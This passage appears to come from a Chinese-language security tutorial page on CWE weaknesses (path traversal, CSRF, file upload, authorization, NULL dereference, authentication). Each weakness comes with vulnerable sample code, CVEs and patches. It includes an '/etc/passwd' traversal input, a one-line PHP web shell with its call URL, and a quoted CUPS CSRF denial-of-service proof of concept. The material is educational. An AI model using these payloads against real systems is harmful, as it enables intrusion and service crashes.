R_BIN_JAVA_ATTR_TYPE_BOOTSTRAP_METHODS_ATTR;\n    if (offset + 8 > sz)  {\n        free (attr);\n        return NULL;\n    }\n    attr->info.bootstrap_methods_attr.num_bootstrap_methods = R_BIN_JAVA_USHORT (buffer, offset);\n    offset += 2;\n    attr->info.bootstrap_methods_attr.bootstrap_methods = r_list_newf (r_bin_java_bootstrap_method_free);\n...\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 120px, var(--bg-transparent-green) 120px 216px, transparent 216px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1e"}}]}]]}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/22.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"“路径遍历”，产品使用外部输入来构建路径名，该路径名旨在识别位于受限父目录下的文件或目录。但通过使用特殊元素如<code class=\"x-inline-highlight\">../</code>序列，如果没有经过中和处理，攻击者可能会访问到受限目录之外的文件。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"上述风险称为“相对路径遍历”，路径遍历还包括使用绝对路径名，例如<code class=\"x-inline-highlight\">/usr/local/bin</code>，这称为“绝对路径遍历”。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"在许多编程语言中，注入空字节可能允许攻击者截断生成的文件名，以扩大攻击范围。例如，产品可能会将<code class=\"x-inline-highlight\">\".txt\"</code>添加到路径名后以限制攻击者只能访问文本文件，但空注入可能会有效地消除此限制。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Perl"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"my $dataPath = \"/users/cwe/profiles\";\nmy $username = param(\"user\");\nmy $profilePath = $dataPath.\"/\".$username;\n\nopen(my $fh, \"<\", $profilePath) || ExitError(\"profile read error: $profilePath\");\nprint \"<ul>\\n\";\nwhile (<$fh>)\n{\n    print \"<li>$_</li>\\n\";\n}\nprint \"</ul>\\n\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1f"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">$username</code>参数没有验证，攻击者可以构造："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"user=../../../etc/passwd"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"user=../../../etc/passwd"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"最终生成以下路径："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"/users/cwe/profiles/../../../etc/passwd"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"/users/cwe/profiles/../../../etc/passwd"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"等同于访问<code class=\"x-inline-highlight\">/etc/passwd</code>。"}}],["$","h4",null,{"className":"x-h3","children":"Example 2"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import os\nimport sys\ndef main():\n    filename = sys.argv[1]\n    path = os.path.join(os.getcwd(), filename)\n    try:\n        with open(path,'r') as f:\n            file_data = f.read()\n    except FileNotFoundError as    e:\n        print(\"Error - file not found\")\nmain()\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$20"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"上述代码会导致“绝对路径遍历”，<code class=\"x-inline-highlight\">os.path.join</code>如果第二个参数传入绝对路径，则会弃用第一个参数<code class=\"x-inline-highlight\">os.getcwd()</code>，直接使用第二个参数<code class=\"x-inline-highlight\">filename</code>。那么传入<code class=\"x-inline-highlight\">/etc/passwd</code>就可能导致同样的攻击。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"一个正确的做法是："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import os\nimport sys\ndef main():\n    filename = sys.argv[1]\n    path = os.path.normpath(f\"{os.getcwd()}{os.sep}{filename}\")\n    try:\n        with open(path,'r') as f:\n            file_data = f.read()\n    except FileNotFoundError as    e:\n        print(\"Error - file not found\")\nmain()\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 120px, var(--bg-transparent-golden) 120px 144px, transparent 144px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$21"}}]}]]}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2023-35947\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2023-35947</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/gradle/gradle/commit/1096b309520a8c315e3b6109a6526de4eabcb879\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/gradle/gradle/commit/1096b309520a8c315e3b6109a6526de4eabcb879</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/gradle/gradle/commit/2e5c34d57d0c0b7f0e8b039a192b91e5c8249d91\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/gradle/gradle/commit/2e5c34d57d0c0b7f0e8b039a192b91e5c8249d91</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"Gradle是一款构建工具，侧重于构建自动化和多语言开发支持。在受影响的版本中，当解压Tar压缩包时，Gradle不会检查文件是否可以写入解压位置之外。这可能导致重要文件在Gradle进程有写入权限的任何地方被覆盖。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"部分补丁的内容："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Java"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"String path = tarEntry.getName();\nString path = safeEntryName(tarEntry);\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 24px, var(--bg-transparent-red) 24px 48px, transparent 48px, transparent 48px, var(--bg-transparent-green) 48px 72px, transparent 72px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token class-name\">String</span> path <span class=\"token operator\">=</span> tarEntry<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">String</span> path <span class=\"token operator\">=</span> <span class=\"token function\">safeEntryName</span><span class=\"token punctuation\">(</span>tarEntry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"进一步去查找<code class=\"x-inline-highlight\">safeEntryName()</code>的功能，溯源到<a href=\"https://github.com/gradle/gradle/blob/master/platforms/core-runtime/files/src/main/java/org/gradle/internal/file/PathTraversalChecker.java\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">PathTraversalChecker.java</a>中的以下代码："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Java"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$22"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 504px, var(--bg-transparent-golden) 504px 672px, transparent 672px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$23"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"其中的核心是高亮的<code class=\"x-inline-highlight\">isUnsafePathName()</code>函数。"}}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/352.html","target":"_blank","rel":"noreferrer","children":"【Compo】CWE-352: Cross-Site Request Forgery (CSRF)"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"跨站请求伪造。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-gray","children":["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"详见<a href=\"/24b/cross-site-request-forgery/\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">Learn CSRF</a>。"}}]}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2009-3022\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2009-3022</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"报告：<a href=\"https://jvndb.jvn.jp/ja/contents/2009/JVNDB-2009-000058.html\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://jvndb.jvn.jp/ja/contents/2009/JVNDB-2009-000058.html</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"在bingo!CMS 1.2及更早版本中存在CSRF漏洞，远程攻击者可劫持其他用户对修改配置或更改内容请求的身份验证。"}}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/434.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-434: Unrestricted Upload of File with Dangerous Type"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"缺少对上传文件类型的验证。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"下面的代码中，前端希望用户上传一个图片，<code class=\"x-inline-highlight\">upload_picture.php</code>处理上传的文件，并尝试储存在<code class=\"x-inline-highlight\">pictures/</code>中。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"HTML"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<form action=\"upload_picture.php\" method=\"post\" enctype=\"multipart/form-data\">\n    Choose a file to upload:\n    <input type=\"file\" name=\"filename\"/>\n    <br/>\n    <input type=\"submit\" name=\"submit\" value=\"Submit\"/>\n</form>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$24"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"//upload_picture.php\n...\n// Define the target location where the picture being\n// uploaded is going to be saved.\n$target = \"pictures/\" . basename($_FILES['uploadedfile']['name']);\n\n// Move the uploaded file to the new location.\nif(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target))\n{\n    echo \"The picture has been successfully uploaded.\";\n}\nelse\n{\n    echo \"There was an error uploading the picture, please try again.\";\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$25"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"上述代码的问题是没有检查传入的文件类型，以至于攻击者可以上传一份<code class=\"x-inline-highlight\">malicious.php</code>，并且用它来执行系统代码："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<?php\n    //malicious.php\n    system($_GET['cmd']);\n?>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token comment\">//malicious.php</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"上传成功后通过类似以下形式的URL调用："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l"}}]}]]}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2019-1010062\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2019-1010062</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/pluck-cms/pluck/commit/09f0ab871bf633973cfd9fc4fe59d4a912397cf8\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/pluck-cms/pluck/commit/09f0ab871bf633973cfd9fc4fe59d4a912397cf8</a>"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"if (isset($_POST['submit'])) {\n    //Check if the file is JPG, PNG or GIF.\n    if (in_array($_FILES['imagefile']['type'], array('image/pjpeg', 'image/jpeg','image/png', 'image/gif'))) {\n        /* fix issue 44. Thanks to Klaus.  */\n        $imagewhitelist = array('jfif', '.png', '.jpg', '.gif', 'jpeg');\n        if (!in_array(strtolower(substr($_FILES['imagefile']['name'], -4)), $imagewhitelist))\n            show_error($lang['general']['upload_failed'], 1);\n        /* end of fix issue 44. Thanks to Klaus.  */\n        if (!copy($_FILES['imagefile']['tmp_name'], 'images/'.$_FILES['imagefile']['name']))\n            show_error($lang['general']['upload_failed'], 1);\n        else {\n            chmod('images/'.$_FILES['imagefile']['name'], 0666);\n            ?>\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 96px, var(--bg-transparent-green) 96px 216px, transparent 216px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$26"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"按照补丁之前的逻辑，修改HTTP请求中的MIME类型就可以绕过原有的验证。"}}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/862.html","target":"_blank","rel":"noreferrer","children":"【C】CWE-862: Missing Authorization"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"缺少授权，没有验证用户是否有权访问资源。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-golden","children":[["$","h4",null,{"className":"x-h3","children":"Authentication & Authorization"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Authentication (AuthN)</code>，身份认证，通常在授权之前完成，是验证“用户是谁”的过程。一般通过账号密码、人脸识别的方式。<br/>例如：员工通过输入用户名和密码登录公司网络。"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Authorization (AuthZ)</code>，授权，是确认用户是否有权访问资源。一般通过角色规则（管理员、普通用户）等方式。<br/>例如：普通员工登录公司网络后，不能访问公司较为敏感的数据。"}}]}]]}]]}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"function runEmployeeQuery($dbName, $name)\n{\n    mysql_select_db($dbName,$globalDbHandle) or die(\"Could not open Database\".$dbName);\n    //Use a prepared statement to avoid CWE-89\n    $preparedStatement = $globalDbHandle->prepare('SELECT * FROM employees WHERE name = :name');\n    $preparedStatement->execute(array(':name' => $name));\n    return $preparedStatement->fetchAll();\n}\n...\n$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$27"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这段代码小心地检查了SQL注入风险（通过<code class=\"x-inline-highlight\">prepare</code>函数），但却没有验证执行数据库操作的用户是否具有权限。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2022-24730\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2022-24730</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"报告：<a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-r9cr-hvjj-496v\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-r9cr-hvjj-496v</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"问题的大致描述为：从v1.3.0开始，未打补丁的Argo CD版本都容易受到路径遍历错误的影响，再加上不适当的访问控制错误，可能允许具有只读存储库访问权限的恶意用户从Argo CD的存储库服务器中泄露敏感文件。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"有读权限的用户可以给<code class=\"x-inline-highlight\">/api/v1/repositories/{repo_url}/appdetails</code>发送带有恶意载荷请求以访问预期之外的文件。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"补丁的作用："}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"防止路径遍历；"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"限制对<code class=\"x-inline-highlight\">/api/v1/repositories/{repo_url}/appdetails</code>的访问权限，只有以下两类用户可以："}}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"1."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"拥有<code class=\"x-inline-highlight\">create</code>权限的用户"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"2."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"拥有<code class=\"x-inline-highlight\">get</code>权限的用户，并且<code class=\"x-inline-highlight\">repo_url</code>已经被给定的应用使用。"}}]}]]}]]}]]}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/476.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-476: NULL Pointer Dereference"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"对空指针解引用（取内容），也就是<code class=\"x-inline-highlight\">*</code>运算符。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"void host_lookup(char *user_supplied_addr)\n{\n    struct hostent *hp;\n    in_addr_t *addr;\n    char hostname[64];\n    in_addr_t inet_addr(const char *cp);\n\n    /*routine that ensures user_supplied_addr is in the right format for conversion */\n\n    validate_addr_form(user_supplied_addr);\n    addr = inet_addr(user_supplied_addr);\n    hp = gethostbyaddr(addr, sizeof(struct in_addr), AF_INET);\n    strcpy(hostname, hp->h_name);\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$28"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"如果<code class=\"x-inline-highlight\">gethostbyaddr</code>返回<code class=\"x-inline-highlight\">NULL</code>，<code class=\"x-inline-highlight\">hp</code>就是空指针，<code class=\"x-inline-highlight\">strcpy</code>会导致空指针解引用。程序缺少对其返回值的检查。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2008-5183\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2008-5183</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://www.exploit-db.com/exploits/7150\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://www.exploit-db.com/exploits/7150</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"通过CSRF发出大量<code class=\"x-inline-highlight\">add-rss-subscription</code>请求，触发空指针引用（此处没有找到源码），进而导致DoS攻击。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"JavaScript"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<!-- cat cups_dos_poc.html  -->\n<script>\n// make 101 CSRFed requests to CUPS daemon via 'img' tags\n// causes CUPS daemon to crash\n// by Adrian 'pagvac' Pastor | GNUCITIZEN.org\n\nfor(var i=1;i<=101;++i) {\n    document.write(\"<img width=0 height=0 \" +\n        \"src=\\\"http://localhost:631/admin/?OP=add-rss-subscription&SUBSCRIPTION_NAME=DOS_TEST_\" +\n        i + \"&PRINTER_URI=%23ALL%23&EVENT_JOB_CREATED=on&MAX_EVENTS=20\\\">\");\n}\n\n/*\nTESTED ON:\n\nUbuntu 8.04.1 (fully patched as of 19th Oct 2008)\nLinux 2.6.24-21-generic #1 SMP Mon Aug 25 17:32:09 UTC 2008 i686 GNU/Linux\n\nopenSUSE 11.0 (i586)\nLinux 2.6.25.5-1.1-default #1 SMP 2008-06-07 01:55:22 +0200 i686 i686 i386 GNU/Linux\n\nCommon UNIX Printing System 1.3.7\n*/\n</script>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$29"}}]}]]}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/287.html","target":"_blank","rel":"noreferrer","children":"【C】CWE-287: Improper Authentication"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"身份认证不当，当声明拥有某个身份时，程序不足以证明该声明是正确的。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Perl"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"my $x = new CGI;\n\nif ($x->cookie('loggedin') ne \"true\")\n{\n    if (!AuthenticateUser($x->param('username'), $x->param('password')))\n    {\n        ExitError(\"Error: you need to log in first\");\n    }\n    else\n    {\n        #Set loggedin and user cookies.\n        $x->cookie(\n            -name = > 'loggedin',\n            -value = > 'true');\n\n        $x->cookie(\n            -name = > 'user',\n            -value = > $x->param('username'));\n    }\n}\n\nif ($x->cookie('user') eq \"Administrator\")\n{\n    DoAdministratorTasks();\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$2a"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"使用cookie做认证，是可以直接被绕过的！"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2022-36436\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2022-36436</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://cert.grnet.gr/en/blog/cve-2022-36436-twisted-vnc-authentication-proxy-authentication-bypass/\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://cert.grnet.gr/en/blog/cve-2022-36436-twisted-vnc-authentication-proxy-authentication-bypass/</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a 